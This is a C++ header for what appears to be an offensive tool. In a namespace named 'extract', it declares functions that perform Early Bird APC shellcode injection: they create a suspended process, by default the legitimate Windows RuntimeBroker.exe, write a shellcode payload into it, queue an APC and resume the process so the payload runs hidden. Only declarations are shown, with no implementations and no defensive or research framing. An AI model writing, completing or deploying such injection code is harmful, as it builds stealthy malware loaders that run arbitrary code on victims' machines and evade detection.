#ifndef EARLY_BIRD_H
#define EARLY_BIRD_H

#include <Windows.h>
#include <vector>

namespace extract {

/**
 * @brief Initialize Early Bird APC with a custom routine
 * @param apc_routine The custom APC routine to queue
 * @param apc_param Parameter to pass to the APC routine
 * @param out_process Handle to the created process (must be closed by caller)
 * @param out_thread Handle to the created thread (must be closed by caller)
 * @return true if initialization succeeded, false otherwise
 */
bool initialize_early_bird_with_routine(
    PAPCFUNC apc_routine,
    ULONG_PTR apc_param,
    HANDLE& out_process,
    HANDLE& out_thread);

/**
 * @brief Initialize Early Bird APC with default process
 * @param target_process The target process to create (default: "RuntimeBroker.exe")
 * @param out_process Handle to the created process (must be closed by caller)
 * @param out_thread Handle to the created thread (must be closed by caller)
 * @return true if initialization succeeded, false otherwise
 */
bool initialize_early_bird(
    const char* target_process,
    HANDLE& out_process,
    HANDLE& out_thread);

/**
 * @brief Create a suspended process and inject shellcode using Early Bird APC
 * @param payload The shellcode to inject
 * @param target_process The target process to create (default: "RuntimeBroker.exe")
 */
void execute_early_bird(
    const std::vector<unsigned char>& payload,
    const char* target_process = "RuntimeBroker.exe");

/**
 * @brief Resume the suspended process to trigger Early Bird APC
 */
void resume_early_bird();

namespace early_bird_internal {
    BOOL InjectShellcodeToRemoteProcess(HANDLE hProcess, PBYTE pShellcode, 
                                      SIZE_T sSizeOfShellcode, PVOID* ppAddress);
    BOOL CreateSuspendedProcess(const char* lpProcessName, DWORD* dwProcessId, 
                               HANDLE* hProcess, HANDLE* hThread);
}

} // namespace extract

#endif // EARLY_BIRD_H 